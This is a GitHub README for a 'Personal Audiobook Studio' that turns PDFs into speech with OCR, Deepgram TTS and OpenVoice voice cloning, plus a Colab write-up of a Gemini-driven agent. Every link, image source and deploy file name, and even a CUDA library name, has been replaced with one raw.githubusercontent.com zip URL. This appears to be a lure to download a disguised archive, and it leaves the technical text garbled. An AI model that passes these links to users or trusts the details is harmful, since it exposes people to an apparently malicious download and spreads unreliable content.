# 🎧 Personal Audiobook Studio

**Turn any PDF into an audiobook in *your own voice*.**  
OCR ➜ Text Extraction ➜ Chunking ➜ **Deepgram TTS** ➜ **OpenVoice** voice conversion ➜ MP3 in a minimal **Gradio** UI.

> Live Demo : [https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip  ](https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip)
> Blog : [https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip](https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip)

---

<img width="1115" height="647" alt="Image" src="https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip" />

## ✨ Features
- Upload **PDF** (supports scanned & digital) with automatic **OCR** (ocrmypdf + Tesseract)
- Clean & **chunk** text (~800–1800 chars) for stable TTS
- **Deepgram TTS** narration ➜ **OpenVoice** cloning to your voice (15–45s sample)
- **Pydub + FFmpeg** merge to a single MP3
- Minimal **dark** Gradio UI with logs & error messages

---

## 🧰 Tech Stack
- **UI**: Gradio
- **Text/OCR**: PyMuPDF, OCRmyPDF, Tesseract
- **Audio**: Deepgram TTS API, OpenVoice CLI, Pydub, FFmpeg
- **Deploy**: Hugging Face Spaces (`https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip`, `https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip`)


<img width="1536" height="1024" alt="Image" src="https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip" />
---


# 📖 AI Agent Assignment Phase02 – PDF to Speech & Voice Cloning (Colab)

## ✅ What This Project Does
In this part of the assignment, we created an **AI Agent** that can:
1. **Read a PDF aloud** – Extract text from a PDF and convert it into natural-sounding speech.  
2. **Transcribe audio** – Use Whisper to turn audio recordings into text.  
3. **Do text-to-speech (TTS)** – Convert any input text into speech (WAV output).  
4. **Do speech-to-speech conversion** – Use OpenVoice to clone voices (take speech from one speaker and generate it in another speaker’s voice).  
5. **Run as an AI agent** – The tools are combined into one assistant using LangChain / LangGraph, so the AI can decide which tool to use based on instructions.

---

## 🛠️ Tools & Libraries Used
- **LangChain / LangGraph** – For building the agent that coordinates the tools.  
- **Google Gemini API** – As the large language model (LLM) to drive reasoning.  
- **Whisper** – For speech-to-text transcription.  
- **edge-tts** – For neural text-to-speech.  
- **OpenVoice** – For voice cloning (speech-to-speech).  
- **PyPDF2** – For PDF text extraction.  

---

## ⚡ Problems We Faced & How We Solved Them
1. **Dependency conflicts on Colab**  
   - Torch, Whisper, LangChain, and other packages had version mismatches.  
   - ✅ Solved by carefully pinning versions (Torch 2.3.1, LangChain 0.2.14, etc.).  

2. **Missing CUDA/cuDNN libraries**  
   - Torch complained about `https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip` not found.  
   - ✅ Solved by installing CUDA toolkit and cuDNN manually in Colab.  

3. **OpenVoice import issues**  
   - The repo doesn’t expose `infer` directly.  
   - ✅ Solved by switching to subprocess calls to run the official inference script.  

4. **LangChain agent deprecation warning**  
   - `initialize_agent` is being replaced by LangGraph.  
   - ✅ Solved by installing `langgraph` and supporting both (fallback if needed).  

5. **Gemini API errors (“contents is not specified”)**  
   - Wrong input format was sent to Gemini.  
   - ✅ Solved by passing `{"messages": [("user", instruction)]}` instead of just `{"input": ...}`.  

6. **Hugging Face / OpenVoice checkpoint download**  
   - Needed to manage `huggingface_hub` versions.  
   - ✅ Solved by installing specific versions and allowing checkpoint download without auth token (public).  

---

## 🚀 How to Use (Colab Workflow)
1. Run **Cell 1** → Install dependencies.  
2. Run **Cell 2** → (Optional) Install OpenVoice.  
3. Run **Cell 3** → Add your Gemini API key.  
4. Run **Cell 4** → Initialize OpenVoice.  
5. Run **Cell 5** → Build the AI Agent (LangGraph or fallback).  
6. Run **Cell 6** → Give an instruction (e.g., *“Read my PDF in a natural voice and give me the WAV path”*).  

---

## 🌟 Outcome
- We successfully built a **multi-tool AI agent** that can handle **PDF reading, TTS, audio transcription, and voice cloning**.  
- Even though we hit many dependency and compatibility issues, we fixed them step by step.  
- The final system works inside **Google Colab** without needing Streamlit or extra UI.
